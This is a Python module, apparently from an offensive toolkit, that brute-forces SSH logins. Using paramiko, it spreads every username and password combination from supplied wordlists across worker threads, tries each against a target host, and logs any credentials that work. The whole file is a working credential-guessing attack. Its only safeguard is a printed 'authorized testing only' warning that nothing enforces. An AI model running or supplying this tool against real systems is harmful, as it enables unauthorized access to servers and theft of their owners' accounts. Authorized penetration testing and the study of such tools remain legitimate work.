#!/usr/bin/env python3
"""SSH Brute Force Module"""
import paramiko
import threading
from queue import Queue

class SSHBrute:
    def __init__(self, host, port, users, wordlist, threads, logger):
        self.host = host
        self.port = port
        self.users = self._load(users)
        self.passwords = self._load(wordlist)
        self.threads = threads
        self.logger = logger
        self.found = []
        self.queue = Queue()
        self.stop = threading.Event()

    def _load(self, path_or_value):
        try:
            with open(path_or_value) as f:
                return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            return [path_or_value]

    def _try(self, user, password):
        if self.stop.is_set():
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.host, port=self.port, username=user,
                           password=password, timeout=5, banner_timeout=5,
                           auth_timeout=5)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            self.logger.debug(f"Connection error: {e}")
            return False

    def _worker(self):
        while not self.queue.empty() and not self.stop.is_set():
            user, pwd = self.queue.get()
            self.logger.info(f"Trying {user}:{pwd}")
            if self._try(user, pwd):
                self.logger.success(f"[FOUND] {user}:{pwd} @ {self.host}:{self.port}")
                self.found.append({"user": user, "password": pwd})
                self.stop.set()
            self.queue.task_done()

    def run(self):
        self.logger.info(f"[*] SSH BruteForce -> {self.host}:{self.port}")
        self.logger.warning("[!] For authorized testing only!")
        for user in self.users:
            for pwd in self.passwords:
                self.queue.put((user, pwd))
        total = self.queue.qsize()
        self.logger.info(f"[*] {total} combinations to try...")

        threads = [threading.Thread(target=self._worker) for _ in range(min(self.threads, 10))]
        for t in threads: t.daemon = True; t.start()
        self.queue.join()

        if self.found:
            self.logger.success(f"[+] Credentials found: {self.found}")
        else:
            self.logger.warning("[-] No credentials found")
        return self.found
